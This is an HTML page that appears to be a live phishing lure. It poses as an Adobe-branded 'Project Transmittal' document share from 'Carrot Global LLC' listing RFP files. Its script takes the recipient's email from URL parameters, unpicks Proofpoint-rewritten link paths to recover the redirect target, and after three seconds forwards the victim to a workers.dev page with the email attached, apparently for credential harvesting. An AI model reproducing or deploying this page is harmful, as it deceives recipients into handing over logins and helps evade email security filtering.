
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Project Transmittal</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
<style>
body{margin:0;font-family:"Segoe UI",Arial,sans-serif;background:#0073C4;display:flex;justify-content:center;padding:40px;color:#323130}
.container{width:100%;max-width:520px;background:#fff;padding:36px;border-radius:6px;border:1px solid #e1dfdd;box-shadow:0 2px 10px rgba(0,0,0,.06)}
.header{display:flex;align-items:center;gap:10px;margin-bottom:8px;flex-wrap:wrap}
.header img.logo{height:48px;width:auto;display:block}
.header i{color:#007a7c;font-size:22px}
h1{font-size:18px;margin:0;font-weight:600}
.sub{font-size:13px;color:#605e5c;margin-bottom:18px}
.file{display:flex;align-items:center;justify-content:space-between;padding:14px;border:1px solid #edebe9;background:#faf9f8;margin-bottom:10px;cursor:pointer;transition:.15s}
.file:hover{background:#f3f2f1}
.left{display:flex;align-items:center;gap:10px}
.icon{color:#0073C4}
.name{font-size:14px;font-weight:600}
.meta{font-size:11px;color:#6655cc}
.btn{width:100%;margin-top:18px;padding:12px;border:none;border-radius:4px;background:#0073C4;color:#fff;font-weight:600;cursor:pointer}
.btn:disabled{background:#000080;cursor:not-allowed}
.security-note{text-align:center;font-size:12px;color:#102a43;margin-top:12px}
.manual-link{display:block;text-align:center;margin-top:15px;font-size:12px;color:#605e5c}
</style>
</head>
<body>
<div class="container">
  <div class="header">
    <img class="logo" src="https://i.postimg.cc/mcTx3YSJ/Adb.webp" alt="Adb" referrerpolicy="no-referrer">
    <i class="fas fa-folder-open"></i>
    <h1>Project Transmittal</h1>
  </div>

  <div class="sub">Carrot Global LLC has shared a document package for your review.</div>

  <div class="file"><div class="left"><i class="fas fa-file-pdf icon"></i><div><div class="name">RFP Overview</div><div class="meta">1.2 MB</div></div></div></div>
  <div class="file"><div class="left"><i class="fas fa-file-lines icon"></i><div><div class="name">Scope of Work</div><div class="meta">892 KB</div></div></div></div>
  <div class="file"><div class="left"><i class="fas fa-file-contract icon"></i><div><div class="name">Bid Guidelines</div><div class="meta">410 KB</div></div></div></div>
  <div class="file"><div class="left"><i class="fas fa-shield-alt icon"></i><div><div class="name">Compliance Requirements</div><div class="meta">2.1 MB</div></div></div></div>

  <button class="btn" id="openBtn">Preparing your secure document...</button>

  <div class="security-note">
    <i class="fas fa-shield-alt"></i> Protected Files Protocol
  </div>
  <a href="#" class="manual-link">Not redirecting? Click here</a>
</div>

<script>
(function(){
  let email=null, redirectTo=null;
  const urlParams=new URLSearchParams(window.location.search);
  email=urlParams.get('email');
  redirectTo=urlParams.get('redirect_to');

  if(!redirectTo){
    const pathname=window.location.pathname;
    const proofpointMatch=pathname.match(/\/CL0\/([^\/]+(?:\/[^\/]+)*?)(?:\/\d+\/|$)/);
    if(proofpointMatch&&proofpointMatch[1]){
      try{
        const decodedUrl=decodeURIComponent(proofpointMatch[1]);
        const decodedParams=new URLSearchParams(decodedUrl.split('?')[1]);
        redirectTo=decodedParams.get('redirect_to');
        if(!email) email=decodedParams.get('email');
      }catch(e){}
    }
  }

  const finalDestination=redirectTo?decodeURIComponent(redirectTo):"https://adobe-files.thyproject.workers.dev";
  const landingPageUrl=email?`${finalDestination}#${email}`:finalDestination;
  document.querySelector('.manual-link').href=landingPageUrl;
  document.getElementById('openBtn').textContent="Redirecting...";
  setTimeout(()=>{window.location.href=landingPageUrl},3000);
})();
</script>
</body>
</html>
